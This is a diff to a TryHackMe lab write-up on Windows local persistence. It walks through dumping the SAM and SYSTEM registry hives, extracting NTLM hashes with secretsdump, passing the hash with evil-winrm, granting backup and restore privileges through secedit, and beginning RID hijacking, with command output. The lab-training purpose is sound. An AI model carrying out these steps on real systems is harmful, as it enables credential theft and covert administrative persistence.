@@ -3,7 +3,7 @@ Module link: https://tryhackme.com/room/windowslocalpersistence
 
 # Assigning Group Memberships
 1. Start this room's machine and our TryHackMe AttackBox
-2. `cd \` to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
+2. `cd \` from the compromised Windows machine to change to the their filesystem's root directory to ensure that we'll be executing the following commands from starting from there
 ```PowerShell
 C:\Users\Administrator>cd \
 ```
@@ -39,7 +39,7 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\thmuser1\Documents> 
 ```
-8. `whoami /groups` to display what groups the currently logged in user is a part of onto our terminal, which showed the **Backup Operators** group to be enabled since we enabled the LocalAccountTokenFilterPolicy registry policy on the compromised Windows machine
+8. `whoami /groups` from the command line in our active WinRM session to display what groups the currently logged in user is a part of onto our terminal, which showed the **Backup Operators** group to be enabled since we enabled the LocalAccountTokenFilterPolicy registry policy on the compromised Windows machine
 ```bash
 *Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
 
@@ -59,23 +59,23 @@ NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory gro
 NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level Label            S-1-16-12288
 ```
-9. `cd \` to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
+9. `cd \` from the command line in our active WinRM session to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
 ```Bash
 *Evil-WinRM* PS C:\Users\thmuser1\Documents> cd \
 ```
-10. `reg save hklm\system {FILENAME1}.bak` to create and save a backup file of the compromised Windows machine's **System** registry key, which successfully created the backup file on the compromised machine
+10. `reg save hklm\system {FILENAME1}.bak` from the command line in our active WinRM session to create and save a backup file of the compromised Windows machine's **System** registry key, which successfully created the backup file on the compromised machine
 ```Bash
 *Evil-WinRM* PS C:\> reg save hklm\system SYSTEM.bak
 The operation completed successfully.
 
 ```
-11. `reg save hklm\sam {FILENAME2}.bak` to create and save a backup file of the compromised Windows machine's **SAM** registry key, which successfully created the backup file on the compromised machine
+11. `reg save hklm\sam {FILENAME2}.bak` from the command line in our active WinRM session to create and save a backup file of the compromised Windows machine's **SAM** registry key, which successfully created the backup file on the compromised machine
 ```Bash
 *Evil-WinRM* PS C:\> reg save hklm\sam SAM.bak
 The operation completed successfully.
 
 ```
-12. `download {FILENAME1}.bak` to download the backup file of the compromised Windows machine's **System** registry key from their system onto our Linux attack machine
+12. `download {FILENAME1}.bak` from the command line in our active WinRM session to download the backup file of the compromised Windows machine's **System** registry key from their system onto our Linux attack machine
 ```Bash
 *Evil-WinRM* PS C:\> download SYSTEM.bak
 Info: Downloading C:\\SYSTEM.bak to SYSTEM.bak
@@ -83,7 +83,7 @@ Info: Downloading C:\\SYSTEM.bak to SYSTEM.bak
                                                              
 Info: Download successful!
 ```
-13. `download {FILENAME2}.bak` to download the backup file of the compromised Windows machine's **SAM** registry key from their system onto our Linux attack machine
+13. `download {FILENAME2}.bak` from the command line in our active WinRM session to download the backup file of the compromised Windows machine's **SAM** registry key from their system onto our Linux attack machine
 ```Bash
 *Evil-WinRM* PS C:\> download SAM.bak
 Info: Downloading C:\\SAM.bak to SAM.bak
@@ -91,7 +91,7 @@ Info: Downloading C:\\SAM.bak to SAM.bak
                                                              
 Info: Download successful!
 ```
-14. `exit` to exit our current PowerShell session on our attack machine and terminate the connection
+14. `exit` from the command line in our active WinRM session to exit our current PowerShell session on our attack machine and terminate the connection
 ```Bash
 *Evil-WinRM* PS C:\> exit
 
@@ -99,13 +99,13 @@ Info: Exiting with code 0
 
 root@ip-10-10-72-227:~# 
 ```
-15. `ls` to display the files and directories that are in our current working directory onto our terminal, which showed that the two backup files were indeed successfully downloaded onto our machine
+15. `ls` from our Linux attack machine to display the files and directories that are in our current working directory onto our terminal, which showed that the two backup files were indeed successfully downloaded onto our machine
 ```Bash
 root@ip-10-10-72-227:~# ls
 Desktop    Instructions  Postman  SAM.bak  SYSTEM.bak         Tools
 Downloads  Pictures      Rooms    Scripts  thinclient_drives  work
 ```
-16. `python3.9 /opt/impacket/examples/secretsdump.py -sam {FILENAME2}.bak -system {FILENAME1}.bak LOCAL` to dump the password hashes of all the users that are in the compromised machine from its SAM registry key that we backed up into a file into Impacket's **secretsdump.py** program (https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), which was already installed on our AttackBox, using both backup files that we created on and retrieved from the compromised machine and output the results onto our terminal, which ended up outputting the compromised machine's administrator's password hash which we can then use to authenticate as the administrator when remotely connecting back to the compromised machine using WinRM
+16. `python3.9 /opt/impacket/examples/secretsdump.py -sam {FILENAME2}.bak -system {FILENAME1}.bak LOCAL` from our Linux attack machine to dump the password hashes of all the users that are in the compromised machine from its SAM registry key that we backed up into a file into Impacket's **secretsdump.py** program (https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), which was already installed on our AttackBox, using both backup files that we created on and retrieved from the compromised machine and output the results onto our terminal, which ended up outputting the compromised machine's administrator's password hash which we can then use to authenticate as the administrator when remotely connecting back to the compromised machine using WinRM
 ```Bash
 root@ip-10-10-72-227:~# python3.9 /opt/impacket/examples/secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL 
 Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
@@ -123,7 +123,7 @@ thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:
 thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
 [*] Cleaning up... 
 ```
-17. `evil-winrm -i {TARGET IP} -u Administrator -H {PASSWORD HASH}` to perform a Pass-the-Hash (PtH) attack on the compromised machine to log in as the Administrator using their password hash, which ended up working
+17. `evil-winrm -i {TARGET IP} -u Administrator -H {PASSWORD HASH}` from our Linux attack machine to perform a Pass-the-Hash (PtH) attack on the compromised machine to log in as the Administrator using their password hash, which ended up working
 ```Bash
 root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
 
@@ -133,7 +133,7 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
 ```
-18. `C:\flags\flag1.exe` to run the flag1.exe program, which ended up displaying this task's flag onto our terminal
+18. `C:\flags\flag1.exe` from the command line in our active WinRM session to run the flag1.exe program, which ended up displaying this task's flag onto our terminal
 ```Bash
 *Evil-WinRM* PS C:\Users\Administrator\Documents> C:\flags\flag1.exe
 THM{FLAG_BACKED_UP!}
@@ -143,7 +143,7 @@ THM{FLAG_BACKED_UP!}
 
 # Assigning Specific Privileges Using Security Descriptors
 1. Start this room's machine and TryHackMe's AttackBox
-2. `PowerShell` to open up PowerShell on the compromised Windows machine
+2. `PowerShell` from the compromised Windows machine to open up PowerShell on the compromised Windows machine
 ```PowerShell
 C:\Users\Administrator>PowerShell
 Windows PowerShell
@@ -151,16 +151,16 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 
 PS C:\Users\Administrator>
 ```
-3. `cd \` to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
+3. `cd \` from the compromised Windows machine to change to the their filesystem's root directory to ensure that we'll be executing the following commands from starting from there
 ```PowerShell
 PS C:\Users\Administrator> cd \
 ```
-4. `whoami` to display who we're running as onto our terminal, which revealed to us that we were running as administrator
+4. `whoami` from the compromised Windows machine to display who we're running as onto our terminal, which revealed to us that we were running as administrator
 ```PowerShell
 PS C:\> whoami
 wpersistence\administrator
 ```
-5. `whoami /priv` to display all the privileges that the Administrator has on the compromised Windows machine, along with their descriptions, onto our terminal
+5. `whoami /priv` from the compromised Windows machine to display all the privileges that the Administrator has on the compromised Windows machine, along with their descriptions, onto our terminal
 ```PowerShell
 PS C:\> whoami /priv
 
@@ -194,14 +194,14 @@ SeTimeZonePrivilege                       Change the time zone                  
 SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
 ```
-6. `secedit /export /cfg {FILENAME1}.inf` to export the compromised machine's security configuration as an information file (**.inf**)
+6. `secedit /export /cfg {FILENAME1}.inf` from the compromised Windows machine to export the compromised machine's security configuration as an information file (**.inf**)
 ```PowerShell
 PS C:\> secedit /export /cfg CONFIG.inf
 
 The task has completed successfully.
 See log %windir%\security\logs\scesrv.log for detail info.
 ```
-7. `dir` to verify that the compromised machine's security configuration has been successfully exported into an information file (**.inf**) onto our currently working directory within the compromised machine from where we executed the command from, which was the case
+7. `dir` from the compromised Windows machine to verify that the compromised machine's security configuration has been successfully exported into an information file (**.inf**) onto our currently working directory within the compromised machine from where we executed the command from, which was the case
 ```PowerShell
 PS C:\> dir
 
@@ -225,24 +225,24 @@ d-r---        3/17/2021   3:13 PM                Searches
 d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/4/2023   2:56 AM          19318 CONFIG.inf
 ```
-8. `notepad {FILENAME1}.inf` to open up the exported information file containing the compromised system's security configuration using Windows' Notepad text editor
+8. `notepad {FILENAME1}.inf` from the compromised Windows machine to open up the exported information file containing the compromised system's security configuration using Windows' Notepad text editor
 ```PowerShell
 PS C:\Users\Administrator> notepad CONFIG.inf
 ```
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/notepad%20CONFIG.inf.png)
 
-9. Once the file has been opened, we'll go and add our target user (thmuser2) at the end of the **SeBackupPrivilege** privilege, which allows a user or a process to bypass file system security restrictions and perform backup operations, and the **SeRestorePrivilege** privilege, which allows a user or a process to bypass file system security restrictions and perform restore operations
+9. Once the file has been opened, we'll go and add our target user (thmuser2) at the end of the **SeBackupPrivilege** privilege, which allows a user or a process to bypass file system security restrictions and perform backup operations, and the **SeRestorePrivilege** privilege, which allows a user or a process to bypass file system security restrictions and perform restore operations, to assign them those privileges, which will allow them to execute the **flag2.exe** program without restrictions
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/CONFIG.inf%20Modifications.png)
 
-10. `secedit /import /cfg {FILENAME1}.inf /db {FILENAME2}.sdb`
+10. `secedit /import /cfg {FILENAME1}.inf /db {FILENAME2}.sdb` from the compromised Windows machine to import our modified information (.inf) file containing the new security configuration for our compromised machine into a security database (.sdb) file, which will store our modified security configuration
 ```PowerShell
-PS C:\> secedit /import /cfg CONFIG.inf /db CONFIG.sdb
+PS C:\> secedit /import /cfg config.inf /db config.sdb
 ```
-11. `secedit /configure /db {FILENAME2}.sdb /cfg config.inf`
+11. `secedit /configure /db {FILENAME2}.sdb /cfg {FILENAME1}.inf` from the compromised Windows machine to override and configure their new security settings using the security database (.sdb) file we created, along with our modified information (.inf) file containing the compromised machine's modified security configuration, which ended up successfully executing
 ```PowerShell
-PS C:\> secedit /configure /db CONFIG.sdb /cfg CONFIG.inf
+PS C:\> secedit /configure /db config.sdb /cfg config.inf
 
 The task has completed successfully.
 See log %windir%\security\logs\scesrv.log for detail info.
@@ -275,7 +275,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 The operation completed successfully.
 ```
-15. `evil-winrm -i {TARGET IP} -u thmuser2 -p Password321`
+15. `evil-winrm -i {TARGET IP} -u thmuser2 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser2) using WinRM
 ```Bash
 root@ip-10-10-254-192:~# evil-winrm -i 10.10.56.140 -u thmuser2 -p Password321
 
@@ -309,7 +309,7 @@ THM{IM_JUST_A_NORMAL_USER}
 
 # RID Hijacking
 1. Start this room's machine
-2. `cd \` to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
+2. `cd \` from the compromised Windows machine to change to the their filesystem's root directory to ensure that we'll be executing the following commands from starting from there
 ```PowerShell
 PS C:\Users\Administrator> cd \
 ```
@@ -360,7 +360,7 @@ Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR
 
 Error: Exiting with code 1
 ```
-7. `sudo remmina`
+7. `sudo remmina` from our Linux attack machine to launch **remmina**, which is a remote desktop client application that we'll use to remotely connect to the compromised machine using RDP, with root privileges
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Remmina%20Window%20Open.png)
 
